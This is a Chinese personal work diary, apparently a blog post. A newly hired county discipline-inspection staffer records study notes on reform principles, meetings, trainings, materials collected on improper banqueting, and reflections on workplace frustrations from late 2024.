<p>完善城乡融合发展体制机制的主要部署：<br>1.健全推进新型城镇化体制机制。<br>2.巩固和完善农村基本经营制度。<br>3.完善强农惠农富农支持制度。<br>4.深化土地制度改革。<br>5.统筹新型工业化、新型城镇化和乡村全面振兴。<br>6.促进城乡要素平等交换、双向流动。</p>
<p>把改革推向前进的必要性（六个必然要求）：<br>1.坚持和完善中国特色社会主义制度、推进国家治理体系和治理能力现代化的必然要求。<br>2.贯彻新发展理念、更好适应我国社会主要矛盾变化的必然要求。<br>3.坚持以人民为中心、让现代化建设成果更多更公平惠及全体人民的必然要求。<br>4.应对重大风险挑战、推动党和国家事业行稳致远的必然要求。<br>5.推动构建人类命运共同体、在百年变局加速演进中赢得战略主动的必然要求。<br>6.深入推进新时代党的建设新的伟大工程、建设更加坚强有力的马克思主义政党的必然要求。</p>
<p>进一步全面深化改革必须坚持的六个原则：<br>1.坚持党的全面领导。<br>2.坚持以人民为中心。<br>3.坚持守正创新。<br>4.坚持以制度建设为主线。<br>5.坚持全面依法治国。<br>6.坚持系统观念。</p>
<p>下午去3点去人大开以案促改会议，下午去党校开以案促改会议。感觉党校的同志都很热情，讲的时候也都在认真的记笔记，不是敷衍了事，向他们学习。</p>
<blockquote>
<p>1.很多表格都没有模板和格式，每个单位交上来的都不一样，感觉这样工作效率会低很多。</p>
<p>2.需要联系的人很多，有点抵触打电话，有待加强。</p>
<p>3.去开会有很多领导，都很热情，隆重介绍，一堆人跟在我后面，很不适应，感觉别扭。</p>
<p>4.其他单位的领导可能对纪委监委的工作比我都熟悉，值得学习。</p>
</blockquote>
<h2 id="2024-10-24"><a href="#2024-10-24" class="headerlink" title="2024.10.24"></a>2024.10.24</h2><p>8点半去社会工作部开以案促改会议。之后收六个单位违规吃喝的情况说明，以案整改情况。</p>
<blockquote>
<p>1.注意纸质版和电子版是否都需要</p>
<p>2.通知好是否需要盖章</p>
<p>3.沟通的艺术</p>
</blockquote>
<h2 id="2024-10-25"><a href="#2024-10-25" class="headerlink" title="2024.10.25"></a>2024.10.25</h2><p>今天比较忙碌，晚上五点半开会分配任务，关于巡视巡察整改专项工作，设计对四个单位进行谈话，所有单位交促改材料、党纪学习教育材料，对四个单位（人大、政协、党校、档案馆）进行谈话等等。</p>
<blockquote>
<p>1.电脑设备太差，影响效率</p>
<p>2.开会效果差，感觉材料应该先发给参会人。</p>
<p>3.很多需要的东西格式、模板都没有统一标准，很麻烦。</p>
<p>4.很多工作牵扯很多单位，需要配合，需要顾及其他单位，不利于开展工作。</p>
</blockquote>
<h2 id="2024-10-26"><a href="#2024-10-26" class="headerlink" title="2024.10.26"></a>2024.10.26</h2><p>今天很忙碌，很多收的材料都要补充其他材料，好在9个单位都很配合工作，县委办公室事情多，材料不能按时交。。。</p>
<p>今天中午跟YWZ和LXB一起加班，我们这批刚刚入职的在工作中也渐渐熟悉起来，之前和他俩没什么交流，今天一起吃了饭，熟悉起来。</p>
<blockquote>
<p>1.谨慎。因违纪违法和违纪这个关键词搞错而复工，耽误了时间。</p>
<p>2.感觉很多地方要求不明确，都要靠打听，可能本来就没有要求吧</p>
</blockquote>
<h2 id="2024-10-27"><a href="#2024-10-27" class="headerlink" title="2024.10.27"></a>2024.10.27</h2><p>约谈情况表最后一栏需要填写以后怎么做。补充日常监督内容。</p>
<blockquote>
<p>1.沟通的艺术（和县委办公室的负责人交流）</p>
</blockquote>
<h2 id="2024-10-28"><a href="#2024-10-28" class="headerlink" title="2024.10.28"></a>2024.10.28</h2><p>省委巡视和以案促改工作告一段落，这段时间收了十个单位的以案促改材料（照片、会议记录、班子成员自我剖析材料、台账、佐证材料、建章立制）。十个单位的党纪学习教育材料（会议记录、照片、方案、通知），违规吃喝整改材料和制度（人大、政协、办公室、党校、机关事务中心），四个单位的谈话（人大、政协、档案馆、党校），党校青年干部培训班的通知文件、培训名单、课程表、培训照片、体现习近平关于加强作风建设的相关内容。县委办24年关于第一议题的所有会议记录。</p>
<blockquote>
<p>感觉还是很有成就感的。</p>
</blockquote>
<h2 id="2024-10-29"><a href="#2024-10-29" class="headerlink" title="2024.10.29"></a>2024.10.29</h2><p>今天发了5张问题线索分办表，可能要办案子了吧，也想挑战一下自己。</p>
<p>人大、政协、党校、县委办、机关事务中心的违规吃喝。</p>
<blockquote>
<p>感觉很多东西都没有明确的规定，比如台账的格式、内容；比如需要填写的签和表无固定格式；所有东西都要靠打听，感觉很难受。</p>
</blockquote>
<h2 id="2024-10-30"><a href="#2024-10-30" class="headerlink" title="2024.10.30"></a>2024.10.30</h2><p>制作了签、表、报告</p>
<h2 id="2024-10-31"><a href="#2024-10-31" class="headerlink" title="2024.10.31"></a>2024.10.31</h2><p>政协来盖章（晋升材料）。</p>
<h2 id="2024-11-01"><a href="#2024-11-01" class="headerlink" title="2024.11.01"></a>2024.11.01</h2><p>写专项行动报告，人大盖章、军工企业办事处盖章。</p>
<p>今天可以转党员关系啦。</p>
<h2 id="2024-11-04"><a href="#2024-11-04" class="headerlink" title="2024.11.04"></a>2024.11.04</h2><p>上午八点半培训。张黎《强化基层“小微权力”管控，筑牢基层执政根基》，申甲佳《如何开展留置内审的谈话工作》</p>
<h2 id="2024-11-05"><a href="#2024-11-05" class="headerlink" title="2024.11.05"></a>2024.11.05</h2><p>无事</p>
<h2 id="2024-11-06"><a href="#2024-11-06" class="headerlink" title="2024.11.06"></a>2024.11.06</h2><p>无事</p>
<h2 id="2024-11-07"><a href="#2024-11-07" class="headerlink" title="2024.11.07"></a>2024.11.07</h2><p>下午三点，关于召开群众身边不正之风和腐败问题集中整治工作座谈推进会议</p>
<h2 id="2024-11-08"><a href="#2024-11-08" class="headerlink" title="2024.11.08"></a>2024.11.08</h2><p>上午8:30-11:00党校四楼培训</p>
<h2 id="2024-11-11"><a href="#2024-11-11" class="headerlink" title="2024.11.11"></a>2024.11.11</h2><p>金融整治工作。个人自查表、单位自查表、省辖市情况汇总表（表1到表5）、零报告汇总表。</p>
<h2 id="2024-11-12"><a href="#2024-11-12" class="headerlink" title="2024.11.12"></a>2024.11.12</h2><p>金融整治纸质版、电子版交八室了。</p>
<h2 id="2024-11-13"><a href="#2024-11-13" class="headerlink" title="2024.11.13"></a>2024.11.13</h2><p>无事</p>
<h2 id="2024-11-14"><a href="#2024-11-14" class="headerlink" title="2024.11.14"></a>2024.11.14</h2><p>吃潮汕火锅，爬燕山</p>
<h2 id="2024-11-15"><a href="#2024-11-15" class="headerlink" title="2024.11.15"></a>2024.11.15</h2><p>无事</p>
<h2 id="2024-11-18"><a href="#2024-11-18" class="headerlink" title="2024.11.18"></a>2024.11.18</h2><p>上午八点半，强业务、促提升业务培训会。</p>
<p>《财务账目审查与审计》王晓</p>
<p>《农村集体经济三资管理》潘鹏</p>
<h2 id="2024-11-19"><a href="#2024-11-19" class="headerlink" title="2024.11.19"></a>2024.11.19</h2><h2 id="2024-11-20"><a href="#2024-11-20" class="headerlink" title="2024.11.20"></a>2024.11.20</h2><p>写日常监督表（关于对机关事务中心开展违反中央八项规定精神的调研方案）</p>
<h2 id="2024-11-21"><a href="#2024-11-21" class="headerlink" title="2024.11.21"></a>2024.11.21</h2><p>无事</p>
<h2 id="2024-11-22"><a href="#2024-11-22" class="headerlink" title="2024.11.22"></a>2024.11.22</h2><p>无事</p>
<h2 id="2024-11-25"><a href="#2024-11-25" class="headerlink" title="2024.11.25"></a>2024.11.25</h2><p>领关于纠治违规建设楼堂馆所、奢华装修问题的通知。</p>
]]></content>
      <categories>
        <category>工作</category>
      </categories>
      <tags>
        <tag>工作日志</tag>
      </tags>
  </entry>
</search>
